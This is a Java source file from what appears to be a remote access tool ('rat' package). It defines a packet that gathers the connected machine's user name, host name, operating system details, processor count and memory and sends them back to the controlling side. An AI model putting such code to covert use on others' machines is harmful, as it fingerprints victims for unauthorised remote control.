/*******************************************************************************
 * Copyright 2016 Johannes Boczek
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *******************************************************************************/

package de.sogomn.rat.packet;

import java.net.InetAddress;
import java.net.UnknownHostException;

import de.sogomn.rat.ActiveConnection;

public class ComputerInfoPacket extends AbstractPingPongPacket {
	
	private String name, hostName, os, osVersion, osArchitecture;
	private int processors;
	private long ram;
	
	public ComputerInfoPacket() {
		//...
	}
	
	@Override
	protected void sendRequest(final ActiveConnection connection) {
		//...
	}
	
	@Override
	protected void sendData(final ActiveConnection connection) {
		connection.writeUtf(name);
		connection.writeUtf(hostName);
		connection.writeUtf(os);
		connection.writeUtf(osVersion);
		connection.writeUtf(osArchitecture);
		connection.writeInt(processors);
		connection.writeLong(ram);
	}
	
	@Override
	protected void receiveRequest(final ActiveConnection connection) {
		//...
	}
	
	@Override
	protected void receiveData(final ActiveConnection connection) {
		name = connection.readUtf();
		hostName = connection.readUtf();
		os = connection.readUtf();
		osVersion = connection.readUtf();
		osArchitecture = connection.readUtf();
		processors = connection.readInt();
		ram = connection.readLong();
	}
	
	@Override
	protected void executeRequest(final ActiveConnection connection) {
		type = DATA;
		name = System.getProperty("user.name");
		os = System.getProperty("os.name");
		osVersion = System.getProperty("os.version");
		osArchitecture = System.getProperty("os.arch");
		processors = Runtime.getRuntime().availableProcessors();
		ram = Runtime.getRuntime().totalMemory();
		
		try {
			hostName = InetAddress.getLocalHost().getHostName();
		} catch (final UnknownHostException ex) {
			hostName = "";
			
			ex.printStackTrace();
		}
		
		connection.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveConnection connection) {
		//...
	}
	
	public String getName() {
		return name;
	}
	
	public String getHostName() {
		return hostName;
	}
	
	public String getOs() {
		return os;
	}
	
	public String getOsVersion() {
		return osVersion;
	}
	
	public String getOsArchitecture() {
		return osArchitecture;
	}
	
	public int getProcessors() {
		return processors;
	}
	
	public long getRam() {
		return ram;
	}
	
}
